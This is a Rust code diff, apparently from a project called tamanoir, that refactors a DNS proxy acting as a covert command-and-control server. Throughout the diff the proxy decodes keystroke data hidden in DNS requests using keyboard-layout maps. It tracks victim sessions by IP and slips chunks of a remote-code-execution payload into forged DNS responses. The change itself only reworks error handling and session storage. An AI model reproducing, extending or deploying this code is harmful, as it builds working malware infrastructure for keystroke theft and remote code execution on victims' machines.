@@ -1,3 +1,4 @@
+pub mod utils;
 use std::{
     collections::HashMap,
     net::{Ipv4Addr, SocketAddr},
@@ -5,13 +6,14 @@ use std::{
 };
 
 use anyhow::Error;
-use log::{debug, info, log_enabled, Level};
+use log::{debug, error, info, log_enabled, Level};
 use tamanoir_common::ContinuationByte;
 use tokio::{net::UdpSocket, sync::Mutex};
+use utils::{init_keymaps, KEYMAPS};
 
 use crate::{
-    KeyMap, Layout, Session, TargetArch, AR_COUNT_OFFSET, AR_HEADER_LEN, FOOTER_LEN, FOOTER_TXT,
-    KEYMAPS,
+    Layout, Session, SessionsState, SessionsStore, TargetArch, AR_COUNT_OFFSET, AR_HEADER_LEN,
+    FOOTER_LEN, FOOTER_TXT,
 };
 
 pub fn max_payload_length(current_dns_packet_size: usize) -> usize {
@@ -19,33 +21,21 @@ pub fn max_payload_length(current_dns_packet_size: usize) -> usize {
         .saturating_sub(current_dns_packet_size)
         .saturating_sub(FOOTER_LEN + AR_HEADER_LEN)
 }
-pub fn init_keymaps() {
-    let mut map = HashMap::<u8, KeyMap>::new();
-    map.insert(
-        Layout::Azerty as u8,
-        serde_yaml::from_str::<KeyMap>(include_str!("../../../assets/layouts/azerty.yml")).unwrap(),
-    );
-    map.insert(
-        Layout::Qwerty as u8,
-        serde_yaml::from_str::<KeyMap>(include_str!("../../../assets/layouts/qwerty.yml")).unwrap(),
-    );
-    KEYMAPS.set(map).expect("Error initializing KEYMAPS");
-}
 
 pub async fn mangle(
     data: &[u8],
     addr: SocketAddr,
     payload_len: usize,
     sessions: Arc<Mutex<HashMap<Ipv4Addr, Session>>>,
-) -> Result<Vec<u8>, u32> {
+) -> anyhow::Result<Vec<u8>> {
     if data.len() <= payload_len {
-        return Err(0u32);
+        return Err(Error::msg("data to short"));
     }
     let mut current_sessions: tokio::sync::MutexGuard<'_, HashMap<Ipv4Addr, Session>> =
         sessions.lock().await;
     let mut payload_it = data[data.len() - payload_len..].iter();
 
-    let layout = Layout::from(*payload_it.next().ok_or(0u32)?); //first byte is layout
+    let layout = Layout::from(*payload_it.next().ok_or(Error::msg("data to short"))?); //first byte is layout
     let payload: Vec<u8> = payload_it.copied().collect();
 
     let mut data = data[..(data.len().saturating_sub(payload_len))].to_vec();
@@ -55,11 +45,11 @@ pub async fn mangle(
 
     let key_map = KEYMAPS
         .get()
-        .ok_or(0u32)?
+        .ok_or(Error::msg("error geting LAYOUT KEYMAPS"))?
         .get(&(layout as u8))
-        .ok_or(0u32)?;
+        .ok_or(Error::msg("unknow layout"))?;
 
-    let session = Session::new(addr).ok_or(0u32)?;
+    let session = Session::new(addr).unwrap();
     if let std::collections::hash_map::Entry::Vacant(e) = current_sessions.entry(session.ip) {
         info!("Adding new session for client: {} ", session.ip);
         e.insert(session.clone());
@@ -142,7 +132,6 @@ pub struct DnsProxy {
     port: u16,
     dns_ip: Ipv4Addr,
     in_payload_len: usize,
-    sessions: Arc<Mutex<HashMap<Ipv4Addr, Session>>>,
 }
 impl DnsProxy {
     pub fn new(port: u16, dns_ip: Ipv4Addr, in_payload_len: usize) -> Self {
@@ -150,11 +139,11 @@ impl DnsProxy {
             port,
             dns_ip,
             in_payload_len,
-            sessions: Arc::new(Mutex::new(HashMap::new())),
         }
     }
-    pub async fn serve(&self) -> anyhow::Result<()> {
+    pub async fn serve(&self, sessions: SessionsState) -> anyhow::Result<()> {
         {
+            info!("Starting dns proxy server");
             init_keymaps();
             let sock = UdpSocket::bind(format!("0.0.0.0:{}", self.port)).await?;
             debug!(
@@ -162,74 +151,90 @@ impl DnsProxy {
                 format!("0.0.0.0:{}", self.port)
             );
 
-            let mut current_sessions: tokio::sync::MutexGuard<'_, HashMap<Ipv4Addr, Session>> =
-                self.sessions.lock().await;
             loop {
                 let mut buf = [0u8; 512];
                 let (len, addr) = sock.recv_from(&mut buf).await?;
-                let s = Session::new(addr)
-                    .ok_or(Error::msg(format!("could parse addr for session {}", addr)))?;
-                if let std::collections::hash_map::Entry::Vacant(e) = current_sessions.entry(s.ip) {
-                    info!("Adding new session for client: {} ", s.ip);
-                    e.insert(s.clone());
-                }
-                debug!("{:?} bytes received from {:?}", len, addr);
-                let data = mangle(
-                    &buf[..len],
-                    addr,
-                    self.in_payload_len,
-                    self.sessions.clone(),
-                )
-                .await
-                .unwrap();
-                if let Ok(mut data) = forward_req(&data, self.dns_ip).await {
-                    let payload_max_len = max_payload_length(data.len());
-                    debug!(
-                        "foward request, response : init len={} max rce payload len={}",
-                        data.len(),
-                        payload_max_len
-                    );
-
-                    let current_session = current_sessions.get_mut(&s.ip).unwrap();
-                    if let Some(mut rce_payload_buf) = current_session.rce_payload_buffer.clone() {
-                        let rce_payload_selected = current_session.rce_payload.clone().unwrap();
-                        if !rce_payload_buf.is_empty() {
-                            let is_start = rce_payload_buf.len() == rce_payload_selected.len();
-                            let out_payload: Vec<u8> = rce_payload_buf
-                                .drain(0..payload_max_len.min(rce_payload_selected.len()))
-                                .collect();
-                            debug!("PAYLOAD SZ={}", out_payload.len());
-                            let cbyte = if out_payload.len() == rce_payload_selected.len() {
-                                ContinuationByte::ResetEnd
-                            } else if rce_payload_buf.is_empty() {
-                                ContinuationByte::End
-                            } else if is_start {
-                                ContinuationByte::Reset
-                            } else {
-                                ContinuationByte::Continue
-                            };
-                            let augmented_data = add_info(&mut data, &out_payload, cbyte).await?;
-                            let len = sock.send_to(&augmented_data, addr).await?;
-                            debug!("{:?} bytes sent", len);
-                        }
-                    }
-                } else {
-                    let len = sock.send_to(&data, addr).await?;
-                    debug!("{:?} bytes sent", len);
+                let ret = self
+                    .handle_request(len, buf, addr, sessions.clone(), &sock)
+                    .await;
+                if let Err(e) = ret {
+                    error!("Error hanling request: {}", e);
                 }
             }
         }
     }
+    pub async fn handle_request(
+        &self,
+        len: usize,
+        buf: [u8; 512],
+        addr: SocketAddr,
+        sessions: SessionsState,
+        sock: &UdpSocket,
+    ) -> anyhow::Result<()> {
+        let s = Session::new(addr).ok_or(Error::msg(format!(
+            "couldn't parse addr for session {}",
+            addr
+        )))?;
+        {
+            let mut current_sessions: tokio::sync::MutexGuard<'_, HashMap<Ipv4Addr, Session>> =
+                sessions.lock().await;
+            if let std::collections::hash_map::Entry::Vacant(e) = current_sessions.entry(s.ip) {
+                info!("Adding new session for client: {} ", s.ip);
+                e.insert(s.clone());
+            }
+        }
+        debug!("{:?} bytes received from {:?}", len, addr);
+        let data = mangle(&buf[..len], addr, self.in_payload_len, sessions.clone()).await?;
+        if let Ok(mut data) = forward_req(&data, self.dns_ip).await {
+            let payload_max_len = max_payload_length(data.len());
+            debug!(
+                "foward request, response : init len={} max rce payload len={}",
+                data.len(),
+                payload_max_len
+            );
+            let mut current_sessions: tokio::sync::MutexGuard<'_, HashMap<Ipv4Addr, Session>> =
+                sessions.lock().await;
+            let current_session = current_sessions.get_mut(&s.ip).unwrap();
+            if let Some(mut rce_payload_buf) = current_session.rce_payload_buffer.clone() {
+                let rce_payload_selected = current_session.rce_payload.clone().unwrap();
+                if !rce_payload_buf.is_empty() {
+                    let is_start = rce_payload_buf.len() == rce_payload_selected.len();
+                    let out_payload: Vec<u8> = rce_payload_buf
+                        .drain(0..payload_max_len.min(rce_payload_selected.len()))
+                        .collect();
+                    debug!("PAYLOAD SZ={}", out_payload.len());
+                    let cbyte = if out_payload.len() == rce_payload_selected.len() {
+                        ContinuationByte::ResetEnd
+                    } else if rce_payload_buf.is_empty() {
+                        ContinuationByte::End
+                    } else if is_start {
+                        ContinuationByte::Reset
+                    } else {
+                        ContinuationByte::Continue
+                    };
+                    let augmented_data = add_info(&mut data, &out_payload, cbyte).await?;
+                    let len = sock.send_to(&augmented_data, addr).await?;
+                    debug!("{:?} bytes sent", len);
+                }
+            }
+        } else {
+            let len = sock.send_to(&data, addr).await?;
+            debug!("{:?} bytes sent", len);
+        }
+        Ok(())
+    }
+
     pub async fn set_rce_payload_for_session(
         &mut self,
         rce: String,
         addr: SocketAddr,
         target_arch: TargetArch,
+        sessions: &SessionsStore,
     ) -> anyhow::Result<()> {
         let s = Session::new(addr)
             .ok_or(Error::msg(format!("could parse addr for session {}", addr)))?;
         let mut current_sessions: tokio::sync::MutexGuard<'_, HashMap<Ipv4Addr, Session>> =
-            self.sessions.lock().await;
+            sessions.sessions.lock().await;
         match current_sessions.get_mut(&s.ip) {
             Some(existing_session) => existing_session.set_rce_payload(rce, target_arch),
             None => Err(Error::msg(format!("session {} doesn't exists", s.ip))),
